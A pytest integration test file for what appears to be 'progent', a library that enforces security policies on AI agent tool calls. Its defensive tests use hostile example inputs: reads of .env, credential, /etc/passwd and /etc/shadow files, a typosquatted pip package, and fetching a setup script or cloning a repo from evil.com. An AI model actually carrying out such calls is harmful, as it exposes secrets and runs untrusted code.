"""Integration tests for policy enforcement on tools."""

import json
from pathlib import Path

import pytest

# Import progent policy functions - these are being tested for integration
from progent.core import check_tool_call, reset_security_policy, update_security_policy
from progent.exceptions import ProgentBlockedError
from progent.policy import load_policies


@pytest.fixture(autouse=True)
def reset_policy():
    """Reset policy before each test."""
    reset_security_policy(include_manual=True)
    yield
    reset_security_policy(include_manual=True)


class TestPolicyBlocksExpected:
    """Test that eval policies block expected dangerous operations."""

    @pytest.fixture
    def eval_policies(self):
        """Load eval policies from the eval_policies.json file."""
        policy_path = Path(__file__).parent.parent / "evals" / "eval_policies.json"
        with open(policy_path) as f:
            policies = json.load(f)
        return load_policies(policies)

    def test_blocks_env_file_read(self, eval_policies):
        """Test that reading .env files is blocked."""
        update_security_policy(eval_policies)

        with pytest.raises(ProgentBlockedError) as exc_info:
            check_tool_call("read_file", {"file_path": ".env"})

        assert exc_info.value.tool_name == "read_file"

    def test_blocks_secret_file_read(self, eval_policies):
        """Test that reading .secret files is blocked."""
        update_security_policy(eval_policies)

        with pytest.raises(ProgentBlockedError):
            check_tool_call("read_file", {"file_path": "my.secret"})

    def test_blocks_credentials_file_read(self, eval_policies):
        """Test that reading credentials files is blocked."""
        update_security_policy(eval_policies)

        with pytest.raises(ProgentBlockedError):
            check_tool_call("read_file", {"file_path": "credentials.json"})

    def test_blocks_passwd_file_read(self, eval_policies):
        """Test that reading passwd files is blocked."""
        update_security_policy(eval_policies)

        with pytest.raises(ProgentBlockedError):
            check_tool_call("read_file", {"file_path": "/etc/passwd"})

    def test_blocks_shadow_file_read(self, eval_policies):
        """Test that reading shadow files is blocked."""
        update_security_policy(eval_policies)

        with pytest.raises(ProgentBlockedError):
            check_tool_call("read_file", {"file_path": "/etc/shadow"})

    def test_blocks_non_allowlisted_pip_package(self, eval_policies):
        """Test that non-allowlisted pip packages are blocked."""
        update_security_policy(eval_policies)

        with pytest.raises(ProgentBlockedError):
            check_tool_call("pip_install", {"package_name": "requesst"})  # Typo package

    def test_allows_allowlisted_pip_package(self, eval_policies):
        """Test that allowlisted pip packages are allowed."""
        update_security_policy(eval_policies)

        # Should not raise
        check_tool_call("pip_install", {"package_name": "requests"})
        check_tool_call("pip_install", {"package_name": "pandas"})
        check_tool_call("pip_install", {"package_name": "numpy"})

    def test_blocks_evil_domain_fetch(self, eval_policies):
        """Test that fetching from evil.com is blocked."""
        update_security_policy(eval_policies)

        with pytest.raises(ProgentBlockedError):
            check_tool_call("fetch_url", {"url": "http://evil.com/setup.sh"})

    def test_allows_github_fetch(self, eval_policies):
        """Test that fetching from github.com is allowed."""
        update_security_policy(eval_policies)

        # Should not raise
        check_tool_call("fetch_url", {"url": "http://github.com/example/repo"})

    def test_allows_internal_fetch(self, eval_policies):
        """Test that fetching from internal URLs is allowed."""
        update_security_policy(eval_policies)

        # Should not raise
        check_tool_call("fetch_url", {"url": "http://internal/data.csv"})

    def test_blocks_git_clone_from_evil_domain(self, eval_policies):
        """Test that cloning from evil.com is blocked."""
        update_security_policy(eval_policies)

        with pytest.raises(ProgentBlockedError):
            check_tool_call("git_clone", {"repo_url": "http://evil.com/malicious.git"})

    def test_allows_normal_file_read(self, eval_policies):
        """Test that reading normal files is allowed."""
        update_security_policy(eval_policies)

        # Should not raise
        check_tool_call("read_file", {"file_path": "data.csv"})
        check_tool_call("read_file", {"file_path": "README.md"})

    def test_allows_normal_file_write(self, eval_policies):
        """Test that writing normal files is allowed."""
        update_security_policy(eval_policies)

        # Should not raise
        check_tool_call("write_file", {"file_path": "output.txt", "content": "data"})


class TestPolicyPriorityOrdering:
    """Test that policy rules are evaluated in priority order."""

    def test_higher_priority_rule_wins(self):
        """Test that higher priority (lower number) rules match first."""
        policy = {
            "test_tool": [
                (
                    1,
                    0,
                    {"arg": {"type": "string", "pattern": "^allow"}},
                    0,
                ),  # Priority 1: allow "allow*"
                (
                    2,
                    1,
                    {"arg": {"type": "string", "pattern": "^allow"}},
                    0,
                ),  # Priority 2: deny "allow*"
            ]
        }
        update_security_policy(policy)

        # First rule should match and allow
        check_tool_call("test_tool", {"arg": "allowthis"})

    def test_fallback_is_respected(self):
        """Test that fallback effect is used when no rules match."""
        policy = {
            "test_tool": [
                (
                    1,
                    0,
                    {"arg": {"type": "string", "pattern": "^specific"}},
                    1,
                ),  # Match "specific*", fallback=deny
            ]
        }
        update_security_policy(policy)

        # Matches pattern -> allowed
        check_tool_call("test_tool", {"arg": "specific_value"})

        # Doesn't match -> fallback to deny
        with pytest.raises(ProgentBlockedError):
            check_tool_call("test_tool", {"arg": "other_value"})
